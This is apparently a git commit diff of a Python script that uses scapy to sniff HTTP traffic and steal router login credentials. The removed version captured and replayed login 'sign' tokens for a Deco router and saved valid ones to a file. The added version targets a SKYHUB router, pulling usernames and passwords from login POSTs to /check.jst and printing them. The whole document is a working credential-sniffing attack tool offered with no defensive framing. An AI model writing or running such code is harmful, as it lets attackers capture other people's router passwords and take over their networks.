029305ad493dddfae7459420e481699a5611ad8d
Echo <66488397+Echowo@users.noreply.github.com>
2021-09-03 11:37:14 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,39 +1,29 @@
-import requests
-from scapy import data
+import logging
 from scapy.all import *
 
-def check_sign(sign):
-    data = {
-        sign.encode()
-    }
-    rq = requests.post('http://' + ip + '/cgi-bin/luci/;stok=/login', data=data)
-    if rq.status_code == 200:
-        return True
-    else:
-        return False
+logging.getLogger('scapy').setLevel(logging.ERROR)
 
 def http_header(packet):
-        print("[+] PACKET: " + packet["IP"].src + " -> " + packet["IP"].dst)
         http_packet=str(packet)
-        if http_packet.find('192.168.68.1'):
-            if http_packet.find('/cgi-bin/luci/;stok=/login'):
-                if http_packet.find('POST'):
-                        return POST_print(packet)
+        if ip in http_packet:
+            if "/check.jst" in http_packet:
+                if "password" in http_packet:
+                    if "POST" in http_packet:
+                        return POST_print(http_packet)
 
 def POST_print(packet1):
-    if "sign=" in "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n")):
-        data = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-        data = data.split('sign=',1)[1].split('\r',1)[0]
-        data = "sign=" + data
-        if check_sign(data):
-            print("[+] FOUND VALID KEY")
-            with open("hashes.txt", "a") as f:
-                f.write(str(data) + "\n")
-            exit()
-        else:
-            pass
+    if "username=" in packet1:
+        packet1 = packet1.replace('b"', '')
+        packet1 = packet1.replace('"', '')
+        packet1 = packet1.replace("b'", "")
+        packet1 = packet1.replace("'", "")
+        packet1 = packet1.replace("&", " ")
+        packet1 = packet1.replace("password=", "")
+        if "username=" in packet1:
+            data = packet1.split('username=',1)[1].split('\r',1)[0]
+            print("[+] GOT CREDENTIALS: " + data)
 
 global ip
-ip = input("[+] Enter target Deco IP Address: ")
+ip = input("[+] Enter target SKYHUB IP Address: ")
 print("[+] LISTENING FOR PACKETS...")
 sniff(iface='enp4s0', prn=http_header, filter="tcp port 80")
